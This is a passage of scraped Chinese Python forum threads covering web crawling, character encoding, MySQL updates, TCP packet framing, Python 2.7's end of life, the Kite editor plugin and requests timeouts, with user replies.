嗯嗯，其实简介里面也有说，我学习爬虫是因为一个比赛。这个比赛的内容其实也很有意思，我也会深入的去思考怎么用不一样的方式去做爬虫。之后我也会把这些内容放到里面吧～\r", "毕竟说是教程，其实某种意义上也是我自己的学习笔记～和大家一同分享。", " 可以预见，一大波车正在开来", "已关注", "关注，请大佬按时发车。", "刚刚 py 入门 @", "支持楼主，希望坚持写下去。", "支持，希望能写一写抓包分析流程，和 JavaScript 分析以及 Ajax 和 JsonP 的东西，前两天有人问我我没时间往细了讲", "导航已收藏~", "资瓷！", "已经关注楼主了", "我觉得写详细点对我这种刚入门的还是很友好的！！！", " 嗯嗯一定的，我会把我遇到的坑，做过的东西都一点一点放出来的。因为我想做一个通俗易懂的读物，所以东西应该也是由浅入深的来。我也会加油的～", "已收藏.", "国内还是推荐使用看云来写技术文档教程 ", " 哈哈 找到你了，我还给你去过 email ，希望能继续出接下来的几集！", " 看云主要优势是什么呢？之前都没有看到有人用过", "做了一个类似的，难点是在于 url 去重，全站 url 攫取，图片下载与替换， dom 截取也过于麻烦，后来就用了 node 了", "已关注，坐等楼主更新，谢谢楼主啦", " gitbook 有的功能看云都有 ，主要包括 GIT+MD+团队写作，还支持付费阅读和打赏，帮助开发者通过文档教程创收", "马克，请务必坚持！", "每一件事情，只要坚持做下去都很了不起", "66666 followed", " \r", " \r", "嗯嗯，我会坚持做下去的～", "我也在学习，请多多指教。\r", "现在测试过程中已经遇到连接数过多的问题了（ Max retries exceeded with url ）。请问有办法解决吗？\r", "重启路由还是不行。\r", "\r", "            requests.adapters.DEFAULT_RETRIES = 5\r", "            requests.session()\r", "            requests.keep_alive = False\r", "\r", "            try:\r", "                response = get(link_iamge, timeout=0.001)\r", "                if response.content_type()>0:\r", "                    with open(file_name, \"wb\") as file:\r", "                        file.write(response.content())\r", "            except Exception as err:\r", "                print(\"Error: {0}\".format(err))\r", "                requests.session().close()", " 这方面我也还没辙呢，可能你试一下在 stackoverflow 问问呢？"]},
{"content": ["<div class=\"topic_content\">内容如下：\r<br>b'\\xb5\\xd8\\xb1d\\xb6\\xea\\xc5\\xe9\\xaf}\\xad\\xb5\\xa4@'\r<br>\r<br>试过好多编码方式都解不出来，求教！</div>"], "reply": "6", "tittle": "Python 字符编码问题，帮忙看下，这是用什么字符编码？", "comment": [">>> chardet.detect(a)\r", "{'encoding': 'Big5', 'confidence': 0.99}\r", ">>> a.decode('Big5')\r", "'華康圓體破音一'", "少复制了一行，这里的 a 就是楼主你贴的那段 byte", " 怒赞！", " 学习了", "get 到一个库", " 奇怪了，为什么我用 chardet 库无法识别出是 Big5 编码呢？你的版本是多少？"]},
{"content": ["<div class=\"topic_content\">由于使用 ngrinder ，写脚本用的 jython 。用过 ngrinder 的都知道，在 web 上调试真的恶心。</div>"], "reply": "5", "tittle": "怎么 pycharm 里调试 jython 程序", "comment": ["跟 python 一样的呀，你碰到什么问题？", " 脚本里需要引入 from net.grinder.script.Grinder import grinder,这个应该是 java 的包吧", " 把包含该类的 jar 放在 jython 的 classpath 里，然后就跟 python 一样 debug", " 弱弱的问一下，把 jar 包放到 /usr/local/Cellar/jython/2.7.0/libexec/javalib 这个目录下可以吗", " 看这个目录名应该可以的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>安装了 anaconda2 之后，使用命令升级：\npip install --upgrade spyder</p>\n<p>最后出现如下错误:\nFound existing installation: Sphinx 1.3.5</p>\n<p>Cannot remove entries from nonexistent file /home/kingmo888/anaconda2/lib/python2.7/site-packages/easy-install.pth</p>\n<p>请问如何解决？</p>\n<p>（第一次用 linux 的系统。谢谢）</p>\n</div></div>"], "reply": "2", "tittle": "ubuntu 升级 Python 的 spyder 遇到问题", "comment": ["试试 conda update spyder , spyder2 升级 3 可能会出现很多问题", " 我自己做了个 spyder 的汉化包，想在 ubuntu 下试试。顺便在 ubuntu 练习"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近尝试用 Python3 写一个简单的爬虫程序，后端使用 MySQL 存储爬取的一些数据，其中定义了一张 URLs 表，表结构很简单，如下：<br>\n| id | url | flag |<br>\n|----|----|-----|<br>\n程序逻辑是先抓取一定量的 URL 存到 URLs 表中，然后每次取一条 URL 进行处理，处理完之后就更新 URLs 表中对应的记录。其中 flag 列就是用来标识该 URL 是否已经经过处理，列的值用 YES/NO 表示。\n相关代码如下：</p>\n<pre><code>def crawler_controller(entry):  \n  # 连接数据库\n  connection = mysql.connector.connect(user='mysql', password='mysql', database='crawler_db')  \n  # 创建游标\n  cursor = connection.cursor()  \n  # 无限循环，直到从数据库取出的记录为空\n  while True:  \n    # 从数据库取出一条 flag 标记为 NO 的记录\n    sql_select_recored = \"SELECT * FROM urls WHERE flag='NO' LIMIT 1\"  \n    cursor.execute(sql_select_recored)  \n    get_values = cursor.fetchall()  \n    \n    # 判断该记录是否存在数据\n    if get_values:  \n      # 处理相应的 url\n      url_parser(get_values)  \n      # 更新已处理的记录，反复测试过，就是这一条出了问题，始终不能更新数据库记录  \n      cursor.execute(\"UPDATE urls SET flag='YES' WHERE id='%s'\", get_values[0][0])  \n      # 完成处理\n      connection.commit()\n      cursor.close()\n    else  \n      break\n  # 关闭数据库连接\n  connection.close()  \n</code></pre>\n<p>现在的问题是，调用 url_parser(get_values)函数处理完 URL 之后，接下来的更新数据库记录死活不能生效，按道理说 get_values[0][0]的值就是对应的记录 id ，而且直接在数据库的 CLI 下面，用</p>\n<pre><code>UPDATE urls SET flag='YES' WHERE id='1'  \n</code></pre>\n<p>测试，这样又是可以更新记录的。<br>\n还望有经验的老司机们指点一二。</p>\n</div></div>"], "reply": "5", "tittle": "Python3 操作 MySQL，数据更新问题。", "comment": ["事务锁吧，干脆用消息队列好了。", "print get_values[0][0] 下看看就知道了\r", "理论上应该是空？ \r", "get_values[0] 试试 print 这个能否输出数据库的 id 字段", "+1 ，打印 get_values[0][0] 看看顺序是否你预期的\r", "\r", "btw, 既然都 limit 1 了，干嘛还用 fetchall ，直接用 fetchone 不就得了", "是不是可以 dict cursor", "建议 select 语句取出所需的列而不是用*，这样可以预计所需 id 的 key 。不过这样的处理还是推荐多线程然后使用队列来操作 MySQL 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>折腾了半天也没弄好</p>\n<pre><code>在代码里是这样的\n@receiver(signal=m2m_changed, sender=User.followings.though)\n会报这个错\nAttributeError: 'ReverseManyRelatedObjectsDescriptor' object has no attribute 'though'\n\n然而在 console 里却不会报错\nUser.followings.through\n&lt;class 'frelanvo_auth.models.User_followings'&gt;\n</code></pre>\n<p>求各位大佬指教啊</p>\n</div></div>"], "reply": "1", "tittle": "深夜求助， Django ManyToMany m2m_changed signals", "comment": ["23333 ， 吃了文化的亏， through 拼错也是醉了，自己还没有看出来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>使用 scrapy 爬虫抓取代理网站，获取大量的免费代理 ip 。过滤出所有可用的 ip ，存入数据库以备使用。</h3>\n<p>从项目开源以来收到了各位 V 友大神的指点，也不断的优化完善羡慕，目前在第一次开源之后做出了如下重大更改：</p>\n<ul>\n<li>添加验证次数，如果验证次数越大，表示该代理 ip 越稳定</li>\n<li>多进程分别验证每一个站点，比如 豆瓣、京东 是在两个不同的进程同时验证，更加保证了代理 IP 的有效性</li>\n<li>更改了 mysql 连接库，从 mysql-connector-python 换成了 pymysql ，并且插入支持事务</li>\n<li>完善了服务器接口参数</li>\n<li>添加了更多代理 IP 站点，目前大概支持 10 个免费代理 IP 站点</li>\n</ul>\n<p>github 地址： <a href=\"https://github.com/awolfly9/IPProxyTool\" rel=\"nofollow\">https://github.com/awolfly9/IPProxyTool</a></p>\n<p>请各位 V 友继续敬请雅正、不舍赐教~<br><br>\nPS:开源真的让我认识了很多 V 站的朋友，也让我受益匪浅，如果你对项目有任何的意见和建议，欢迎加我微信指点 QXdvbGZseQ==(base64)</p>\n</div></div>"], "reply": "29", "tittle": "开源项目免费爬虫代理框架 IPProxyTool 请各位 V 友 敬请雅正、不舍赐教~", "comment": ["先收藏了，主要想看看网络这块编程怎么写", " 可以加我微信，一起进步哦~", "先收藏。。。", "已 star", "对于我们这些不会 Python 的，作者可不可以做成 API 返回 json 的格式供我们调用？", "  有的，但是现在没有开放，可以私聊我", "代理网站给的免费代理 IP 可用性如何？之前弄过类似，发现这种免费的 IP 可用性非常差后来就放弃了。现在 Scrapy 提供的 Crawlera （付费的，购买的是 25 刀那个 plan ），感觉很不错。", "如果可以的话方便提供 python3 的支持吗？", " 在后续会更新，目前主要是我的开发环境都是在 python 2.7.12", "所以，和 ", " 的区别是？", " 代理网站给的代理 ip 多半是不靠谱的，但是还是有少量漏网之鱼可以使用，而且这些还是比较稳定的，所以需要不断的验证抓取到的代理 ip", " 我在项目刚开始的时候参考了 IPProxyPool ，后来不断的更新完善，现在已经和 IPProxyPool 是两种不同的思路了", "这些网站的免费 IP 有效率不到 10%，收费的有效 IP 不到 30%", " 国外的免费网站提供的代理 IP 有效率高很多，国内的需要自己去洗出有效的 IP", "前几个月好像就用过，感觉还不错；免费的 IP 会不会有的 IP 蜜罐", "之前就在用，但 ip 还是太少了，毕竟是免费的", " @", "  现在 IP 增多了，之前设置删除的时间太短了", "已经 star  过两天放假了再看看～", " 我以为大部分都是蜜罐", " 推荐一个？我只需要国内的 ip 地址的", "看了一下不错，可惜不喜欢 mysql", "现在的年轻人都不知道 proxyhunter 了吧", " 还真没有听过。马上查一下。感谢赐教。", " 后续会支持其他数据库。", " 代理猎手赞一个， 12 年的时候还在用，很老的软件，当年也是扫描验证代理的精品", "![]( ", " )  \r", "boos douban liepin 这些表名什么意思额", "额 不用回我，晓得咯 ![]( ", " )", " 所以仔细看 readme 还是有必要的  😝", "OK, 给 star"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如服务端发送\n00 01 ； 00 02 两个包\n客户端用 python socket.recv()的函数会接收到 00 01 00 02 （粘连在一起）\n如何分包？\n服务端我无法控制。\n客户端用 python3</p>\n<p>之前发在 segmentfault 没人理。。。\n<a href=\"https://segmentfault.com/q/1010000008888222\" rel=\"nofollow\">https://segmentfault.com/q/1010000008888222</a></p>\n</div></div>"], "reply": "31", "tittle": "Python socket 通信如何分包", "comment": ["发一个，等几秒再发第二个", "尾部特殊字符，或者头部用 2 字节表明 body 的长度", " \r", " 服务端不可控", " 那就自己按照包大小或者包格式分割一下，如果没有固定格式，弃坑吧", " 服务端都不能标明你 body 的长度或者截止位置，你能怎么办，没办法", "TCP 是数据流。", " \r", " \r", " TAT 那 wireshark 怎么实现分包的", "tcp 流式数据你是分不了包的。只能加结束符或者发送 content length 之类的东西来判断。", "tcp 是流，这种需求不如试试 udp", "socket.recv(num) 可以指定接收字节数", " 抓包工具抓的并不只是 tcp 层面的数据。一个 tcp 包除了发送或者接收的数据还包括了很多内容，比如目标端口，原端口，也有些包不包含应用层的数据。和你理解的接收包不是一回事。解释起来很复杂，但是在应用层的层面上 TCP 应用层的应用是分不清楚包的。如果一定要按照包来处理内容，请使用 UDP 。\r", "当然，使用 UDP 你肯定会遇到更多麻烦。", "tcp 不需要分包。按照应用层协议解析就好", "如果你是 Linux 的 UNIX Socket ，可以试试 SEQPACKET 协议。\r", "如果是 TCP ，那么建议自己设计一个头，里面包含数据长度，就像 HTTP 的 Content-length 一样", " TCP 在传递到 IP 层的时候会分成一个个 Segment ， Segment 的大小由 MSS 决定。每个 Segment 被封装到一个 IP 包里面。但是 Segment 对于应用程序是不可见的，应用程序看到的就是流。", " \r", " \r", " \r", " (´･_･`)模拟某个客户端的啦，我再想办法找找他的处理模式\r", "\r", " @", " ｡◕‿◕｡感谢解惑", "既然是ｔｃｐ，本身是流，肯定要有数据协议，就是根据数据包格式，起始标识符，长度域或结束符来判断完整的一包．具体就是逐字节的读取，判断，直到一完整包，给上层，继续读取判断．", "如果每个包长度都小于 MSS ，你也可以用 raw socket 自己收 233", " 即使每个包长度都小于 MSS ，如果服务端开启了 nagle ，一样会有这问题吧", "TCP 是面向数据流的啊，你可以自己定义一个应用层的格式，比如每个包头包含这个包的大小。 recv 的时候先接收包头大小的内容，然后再根据包头接受剩下的数据。当你用直接用 TCP 协议的时候，就不用考虑下面的分包问题了。除非你想用 UDP", "1.每个包以长度开头\r", "2.用库或者自己再实现一层 buffer ，用 deque 实现不难的\r", "3.SCTP", "关了 nagle ，每次 flush ，接收端读取频率够高的话，应该不会粘\r", "但是不保证，毕竟\r", "1.操作系统可以有其他实现\r", "2.拥塞控制 /流控挡了一下，剩下的在发送缓冲合并了\r", "3.接收乱序，等到齐了的时候一起进接收缓冲\r", "4.服务端程序被其他事件打断，睡了一会", "TCP 确实是一个包一个包发的， wireshark 也能看到。\r", "编程用的 API 是 socket ， socket 是在 TCP 和 UDP 之上又提供了一层抽象。用 socket 处理 SOCK_STREAM ，是流式数据，需要自己再定义包头校验。", "我们一般用 tlv ， type ， length ， value ，其中 tl 大小固定，叫做包头， value 变长，由 length 决定。先只收包头，收到以后再根据长度收取 value 。", "用常规方法实现不了，或许可以试试非常规方法。比如用 scapy 抓取 ip 包，然后从中拿到数据。", "什么 content-length, 换行符等特殊字符啊都是简单的应用层协议啊", "就像 HTTP 服务器一样，有三种方式：\r", "一 写完数据， flush 一下缓存\r", "二 用 CONTENT-LENGTH 来标明 PAYLOAD 的大小\r", "三 用类似于 HTTP1.1 的 TRANSFER-ENCODING 的格式来分块", "1. 最简单的是强制规定每个包都是固定长度, 比如 64bytes  每次 .recv(64) 就是一个包\r", "\r", "2. 稍微复杂一点, 用一小段序列作为包之间的分隔两个包,比如  b'\\xff\\xee\\xcc\\xaa\\xbb\\xdd\\x00'\r", "收到的东西先存到 buffer 里, 然后根据这段序列自己分隔\r", "优点是很简单, 缺点是可能会误分隔, 以及安全问题. 需要自己处理转义\r", "\r", "3. 更复杂的是自己设计一个简单的协议(参考 HTTP)  在协议头部标明内容的长度等一些元信息, 接收端 buffer 后进行分割, 不容易出错\r", "\r", "不知道有没有现成的库能做这种事情, 有的话请[at]我", " SCTP over udp?", "自己定协议 然后自己分包，实现参考 netty", "早在在 segmentfault 看到你的问题了。。。。。  没有做过所以也没法回答 orz", "首先要 坚定 TCP 是流 的信念\r", "然后才能想到如何在流里区分数据的开始和结束\r", "而不是幻想着把应用层的开始结束标志和 TCP segment 对应起来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"python 2.7 will retire\" src=\"https://ooo.0o0.ooo/2017/03/30/58dcc1740c333.jpg\"></p>\n</div></div>"], "reply": "59", "tittle": "Python 2.7 倒计时", "comment": ["我们公司还在用 Python 2.6  \r", "\r", "\r", "\r", "哭死了", "新项目上 Python3 ，历史遗留项目用 Python2.7 也正常啊。还有 3 年呢，三年到期又没说不让继续用，哭啥，只是不继续提供支持了。\r", "\r", "三年后还在 2.7 的项目要么没什么用户了，要么可以抛弃了。", "要不是 node-gyp 我早就用 3 了", "我同学她妹妹在澳大利亚学计算机，他们教的都是 Python3", "2#说的挺好", "只用 3 的路过", "我这儿还有 MS-DOS 下用 turbo c 开发的系统在运行呢，所以不用怕", "大家可以利用 python3.5+的一些新特性创造一些新东西。", "一直用 python2.7 ，好用、方便、不折腾。", "一直倒计时，从未被抛弃", "刚刚迁移到 CentOS7 ，不然默认版本源 2.6 抓急了。。", "日记贴", "docker 用户淡定路过。", "说的跟真的一样", "话说 3 年后软件行业变成啥样都说不好。", "2.7 主流，貌似没多少人用 3 吧？", "新的项目完全用 python3 了，感觉和 2 得区别不大， 特性更多。", "公司几乎都是 3 ，实在不能理解 2.7 的老古董们， Python3 都发布近 10 年了", " 我就还在用 2.7 。\r", "\r", "不是守旧，业务压力和时间摆在那，特别是软件工程里考虑的往往不是一个人熟练用哪个。而且旧有项目是逐步迁移还是一次性直接重造轮子切业务，也都要看具体情况。\r", "\r", "守旧派固然有， PHP5.3 到现在大批用户，死也不想学 PHP7 ，但毕竟不是所有的人都是这种不愿意更新的老顽固。", " 可能是我比较偏激吧，兼容是必要的，然而不破不立，今年可以兼容去年，然而后年呢？三年之后又三年呢，老旧技术并非稳定，而更有可能是稳定的坑。", "python 3 的步子迈得太大了，这点还是得和 Java 学一下， JVM8 跑 JAVA7 的代码还是无压力的。\r", "\r", "python 2.7 的好处也在于是开源的，因此有什么坑自己没准还能填上。\r", "\r", " 单纯用发布多久来衡量是不对的，一般至少要等这种大版本发布 2-3 年之后才会开始大规模用。尤其你要考虑到重写的代价以及业务压力。银行系统里面十几二十年老的系统多的是。业务没有急迫的需求，就不要随意上新技术… \r", "\r", "一般上新技术的步骤都是几个小产品先踩坑，踩的差不多了协助稍微有点流量的来上线，继续踩坑，最后才是最大最重要的产品。", "这是非官方的倡议，官方只是说 Python2 今后只维护不加 feature\r", "只要有人用，官方总不能看着用户死吧\r", "毕竟我教授现在还在 Python2\r", "除了 CS 内行，那些搞计算科学的，全都是能用 2 就用 2\r", "反正也看不出 3 有啥好，我只要能用（原话）", "我这生产环境目前还没有预装 python3 ，稳最重要了，不着急跟风", "我们老师在用 perl 4 的脚本给我们改作业。。。", "XP 到期多久了，占有率下降了很多吗？", "2.7 还是继续用 2 年再说，到最后一年再考虑换 3", "会不会最后就分成两种语言了", "文字工作者喜欢用 py3\r", "数据处理 其实 py2 py3 无所谓 何况 py2 还快点", "国内主流服务器用的还是 py2.6", "主要看 centos 这些里面系统内置的是什么版本。他们什么时候改成 3 了，估计就会推进换代了。主要现在 centos7 默认的系统还是 python2", "这帖子似曾相识。。。", "Node Gyp 好像没升级到 Python 3 。。。", "winxp 据说早不支持了，不还很多人在用", "每周一次的帖子……\r", " 讲道理 2 不是主流， 3 才是啊", "3 年之后又 3 年", "微软都 win10 了， win7 还退休了，我还在用 winxp 和 py2.7.....", "php5.2 还可以奋斗一辈子。哈哈哈", "别慌啊，要说升级到 py3 ，多少等 mac 自带默认 py3 才开始吧 [斜眼笑]", "\r", "\r", "不支持 python3 的包已经不多了", "pypy 3.5 也出了，这几年如果我还在用 python,今年年底可以开始切换了。", "我觉得 2.7 还会战很久，什么时候 centos 的默认版本是 3.X 。。。就到了我要升级的时候", "  php5.2 恐怖了，以为我们 5.3 已经算最低的了", "让我想到我的 node 项目，现在 node 都是 7.x 了，然后我们有个项目还是 0.10.x", " 什么时候 mac 预装 3 了我就用 3...", " 等用了 5.3  5.4  5.6  7  的新特性，就会觉得真值", "太好了！！！！！！", "  这是真的。基本问我一些程序安装问题的，基本他的 PHP 环境就是 5.2 的。\r", " 我只是说国内的人员环境。我自己工作也是一直用 7.1.3", " 我觉得 /usr/bin/python 肯定还是 2 ，不过会另外带一个 /usr/bin/python3 ……", " CS 不就是「计算科学」么……", " 我见过现在还在运行 php4 的……", "线上几千台机器的 python 还是 2.4 的默默无语", "超市收银员说，我们还在用 DOS 呢", " 自带什么版本无所谓，反正是统一自己编译安装", "说的跟真的一样", " 计算科学指的是 Computational Science ，利用计算机研究自然科学\r", "计算机科学才是 CS", "已经在生产环境使用 3.5.2 snaic uvloop 的飘过，当然你有兴趣，也可以加入我们，请投简历到 \r", " \r", "应该是嵌入版 xp 或 ce 吧", " 得到了，维基了一下就明白了…… 是在下孤陋寡闻了", " hhh"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>上个礼拜根据我们公司项目 Pwnhub 的技术栈（大概涉及到 Django 、 DjangoRestFramework 、 Vue 、 API 通信、微信公众号、 Docker 等方面的安全开发），写的一篇文章。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/26134332\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/26134332</a></p>\n<p>“绝对不是干货”！[doge]</p>\n</div></div>"], "reply": "8", "tittle": "[干货] Django 安全开发", "comment": ["写的挺好的。", "p 神在 v 站的帖子居然没人顶", " 我的程序员之路还需继续努力", " 哪有_(:з」∠)_", "m", "写的不错，赞", "不错", "沾沾喜气"]},
{"content": ["<div class=\"topic_content\">一年多之前开始关注 kite 。从最初的内测用户一点点看着 kite 成长起来。今天终于正式发布了。敲开心！！！\r<br>\r<br>写 Python 的效率从此大大提升。\r<br>\r<br>官网介绍视频对功能介绍得非常清楚（用了 matplotlib 的案例实在是太戳人了   泪目）\r<br>\r<br>传送门：\r<br><a target=\"_blank\" href=\"https://kite.com/ref/eesWDmm\" rel=\"nofollow\">https://kite.com/ref/eesWDmm</a></div>"], "reply": "56", "tittle": "Python 的同学们有福了——效率神器 Kite 正式发布", "comment": ["无邀请链接地址： ", "jetbrains 全家桶在手， python 说走就走", "想问一下特色是啥？感觉官网上介绍的几个不是特别出色？", "自动补全", "7.9 美元一个月 还是有点舍不得", "相当于搜狗云输入法，每次输入会将当前代码发送给 kite ，不安全。", "感觉有的东西 atom 上现有的都有了啊？看不出差异在哪。。", "很好，已下载\r", "\r", "特色官网说了 4 个：\r", "- 基于 rank 的自动补全，这个很赞，现在用的工具大都是按字母排序自动补全的\r", "- 常用模式，罗列了这个方法常用的模式，对于一个新的比较出名的包，这很有用。比如有一天你突然想用 matplotlib 了，它很出名，但是你以前没有用过。这里有很多常用的方法\r", "- 文档\r", "- 范例", "安装了一下，果断卸载", "for Sublime Text 3 的在哪下载", "效率神器是把方法名字都给背下来。", "一个编辑器竟然还要 cloud based ，无爱，虽然功能看起来很吸引人。", "vim 路过", "马克", "看上去很好用的样子", "太慢了，这边敲完，看着 kite 的字符一个一个的出来", "太慢了", "这域名 值好几百万吧。。。", "这是编辑器？？我摸了一会儿只会一个 search 查看文档的功能？？", "期待视频最后说的更多的需要支持，能加上 java 就再好不过了", "一般吧...", "试试就知道了", "不支持 vim..", "域名值钱，不过感觉 pycharm 已经够好了。", "花钱买卡？", "这软件好智障，插件怎么装？", " \r", "\r", "是的，直接卖给中国的互联网创业团队， 然后去加州海滩晒太阳不行？ \r", " ", "干嘛呢这是， vscode 已经是主力了，这东西不支持 vscode", "有一个很酷炫的侧边栏。\r", "The smart copilot for old drivers", "我看好这个，早就应该有这种基于 rank 的自动补全了，打代码就应该和普通输入法一样舒服才对", "Jetbrains 笑而不语，这定价想钱想疯了", "sublime 党路过", "Sublime / Atom / PyCharm / Vim + YCM / autocomplete-python 足矣！ \r", "\r", "真以不知道这个是干啥的？ 写代码的快乐已然被工具给分散了！", "看起来不错，但是要上传代码这点真的不好啊。。", "基于 rank 的补全是个好 feature ，但不足以成为一个产品。", "这个比 pycharm 如何 试过好多 ide 目前没发现比 pycharm 好用的", "如果有离线版就好了", "这定价~~真的是！！！", " 不不不~恰恰相反，这个想法很好\r", "以前是：\r", "PyCharm/vscode/atom/vim +google@chrome + blog@chrome + github@chrome + stackoverflow@chrome 。。。。\r", "这个的理想是：\r", "PyCharm/atom/sublime + kite \r", "想法还是很美好的，最后看他的实现情况了~", "让我想起了写 matlab 的美好时光~\r", "虽然 matlab 脚本语法很搓~但是官方提供的离线文档，和随着编码即时弹出的文档提示真的很赞啊", " 支持 vim 啊", "没有 linux 不开心", "后面还要支持 java go js c#等等等等。\r", "\r", "宇宙第一编辑器 VS 表示：那么想问下这货有些什么特性？", "useless", "已卸载。。。不够五分钟。。。", "这东西不难实现啊 自己公司随便搞台机器就可以了 还不受网速限制 刚好大家都写同样的项目 用差不多的包", "  ", "就是支持多个编辑器比较麻烦 emacs 还是很简单的", "  ", "这要是前几年 做个好点的 ppt ……", "好贵", "这东西需要上传代码，安全上完全不能考虑使用。只觉得他们的 kite.com/doc 还不错。", "我在终端里面用 vim ，这个能用吗……", " 无邀请网页手机端适配不完美，那个邮箱输入框 width 好像多了", "继续用我的 PyCharm 。。。\r", "\r", "楼主倒是实在，推广链接这么明显，要我就套一层短链接。", "原计划 吹\r", "实际使用情况应该远不如视频中的效果好\r", "\r", "另外 Python 一个很好的特性就是 大部分标准库都可以通过函数名来猜测出用途\r", "\r", "而 VsCode 的某个插件可以帮助看到函数的参数", " java 需要这个？", " IntelliJ 不是早就支持按照上下文提示吗。", " 是的，炒鸡慢", "pycharm 有补全啊， vsc 也有插件可以补全。\r", "文档功能又不如 dash 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>@binux</p>\n<p>pyspider 很好用，但是有一点缩手缩脚的是在网页里写代码。</p>\n<p>缩进还好说，毕竟多按几次 tab 对比一下就行了，但是代码自动补全就不行了，像我这种刚开始玩 python 的人，没有 IDE 简直不能活啊。。\nIDE 写 10 行代码的功夫，在网页里才写 1 行。</p>\n<p>所以问下，有没有配置的教程，像<a href=\"http://stackoverflow.com/questions/21788939/how-to-use-pycharm-to-debug-scrapy-projects\" rel=\"nofollow\">How to use PyCharm to debug Scrapy projects</a>一样</p>\n</div></div>"], "reply": "11", "tittle": "怎么在 pycharm 里编写 pyspider 的代码", "comment": [" 请问 windows 咋整", " #3 windows 也有东西支持 webdav 的吧", " 谢谢", " python3 无法用 webdav ？？？", " #6 可以吧", " \r", "\r", "   \r", "\r", "\r", "\r", "报错如下：\r", "\r", " \r", "\r", " ", "楼主请问你的解决了么", " #8 v0.3.9 支持了啊", " 我用的是 2.2.1 ，没法用……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>此该我的心情只能用\n。。。。</p>\n</div></div>", "<div class=\"topic_content\">当然你们可能不信，那么我就举个例子吧，用 gevent 调用 requests 并行访问谷歌，设置超时为 1S ，如果是 10 个并 行\r<br>,你们觉得时间应该是多少？</div>", "<div class=\"topic_content\">我的锅。。\r<br>是我不应该 tornado+request+gevent\r<br>tornado 就应该用 AsyncHTTPClient</div>"], "reply": "19", "tittle": "今天才知道 gevent 不支持 requests 库", "comment": ["真的吗", "谁说不支持？ 我用的好好的。。", "你们这些年轻人不要总想搞个大新闻", "好象是的?", "那我用的是假的 gevent 的吗？", "6 楼+1", "grequests", " 你看下到底有没有省时间", " 亲测节省了", "  兄臺，你肯定是使用不對。 3000 多 URL ，我 10 來秒就搞定了，下載保存的文件有接近 100MB ，你說省時間沒有。 \r", "\r", "你打開方式不對啊。。。另外，注意複用 session 也能省不少時間。", "關鍵字 session ， adapter ， Pool ， monkeypatch", " adapter/adaptor 是啥?", " 你代码怎么写的？", "访问 google ？我司应该几十毫秒吧。\r", "不要总想着在愚人节搞个大新闻，你不 monkeypatch 又有多少程序能支持 gevent 啊。楼主你啊， too youny too simple, sometime naive 。还是要学习一个的。", " 我説的是 gevent.joinall 啊，如果他能并发，你説有多少呢？", " gevent.joinall 只是等待所有请求啊？为什么就不能并发呢？搞不懂", "不要整天搞个大新闻，问问题就应该将你的最小可重复执行环境给贴出来", "gevent 不是协程库么？？？？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 requests 时，发现一个问题。</p>\n<p>一个基本的请求。</p>\n<pre><code>requests.get('http://www.xxx.com', headers=headers)\n</code></pre>\n<p>当用多线程时:\n效率会明显提高，但是如果这个 url 是打不开的，那多线程会变得与单线程一样，会卡在那个不能打开的 url 上一直等待到报错。\ntimeout 参数只对可以打开的 url 有效果。</p>\n<p>多线程:</p>\n<pre><code>def getHtml(url):\n    try:\n        requests.get(url)\n        print(url)\n    except:\n        print(\"wrong: {0}\".format(url))\n</code></pre>\n<p>0 (仅测试。)</p>\n<pre><code>import threading\nfor url in urls:\n    worker = threading.Thread(target=getHtml, args=(url,))\n    worker.start()\n</code></pre>\n<p>问题依旧。</p>\n<p>1 使用封装的线程池。</p>\n<pre><code>from concurrent.futures import ThreadPoolExecutor\n\nwith ThreadPoolExecutor(max_workers=10) as t:\n    for url in urls:\n        t.submit(getHtml, url)\n</code></pre>\n<p>查到用 map 方法可以设置 timeout ，不过设置后发现没用。。</p>\n<pre><code>with ThreadPoolExecutor(max_workers=10) as t:\n    t.map(getHtml, urls, timeout=1)\n</code></pre>\n<p>2 使用 multiprocessing.dummy 的线程池。</p>\n<p>发现一篇用这个库的文章。\n<a href=\"https://segmentfault.com/a/1190000000382873\" rel=\"nofollow\">https://segmentfault.com/a/1190000000382873</a></p>\n<pre><code>from multiprocessing.dummy import Pool as ThraedPool\npool = ThreadPool(10)\npool.map(getHtml, urls)\npool.close()\npool.join()\n\n</code></pre>\n<p>还是一样。遇到打不开的网址都会等待。</p>\n<p>测试数据:</p>\n<pre><code>urls = [\n'http://huahao917.com',\n'http://huanreshebei.net',\n'http://hyjsbj.com',\n'http://hzjfwj.com',\n'http://kitairu.net',\n'http://jy-qj.com.cn',\n'http://luosi580.com',\n'http://lyljbj.com',\n'http://psxti.com',\n'http://pt-ti.cn']\n</code></pre>\n<p>其中 <a href=\"http://jy-qj.com.cn\" rel=\"nofollow\">http://jy-qj.com.cn</a> 与 <a href=\"http://hzjfwj.com\" rel=\"nofollow\">http://hzjfwj.com</a> 是无法访问的。</p>\n<p>urllib.urlrequest.urlopen 与 requests 一样会等待，有什么办法可以不在那个无法访问的网址上等待？</p>\n<p>还是我的多线程姿势用错了？望指教。</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>python 3.4.1 64位 requests2.9.1 windows 7 64位。</p>\n</div></div>"], "reply": "20", "tittle": "requests 多线程与无法访问的 url 问题。", "comment": ["pool.join() 的意思不就是等待所有线程结束吗？", "[xiaoyu@MacBook-Pro:~]$ ping ", "\r", "PING ", " (210.209.82.181): 56 data bytes\r", "Request timeout for icmp_seq 0\r", "Request timeout for icmp_seq 1\r", "Request timeout for icmp_seq 2\r", "^C\r", "--- ", " ping statistics ---\r", "4 packets transmitted, 0 packets received, 100.0% packet loss\r", "[xiaoyu@MacBook-Pro:~]$ ping jy-qj.com.cn\r", "ping: cannot resolve jy-qj.com.cn: Unknown host\r", "\r", "你是 requests ", " 的时候卡住了吧，设置 response = ", "', timeout=5)超时就好了", " \r", 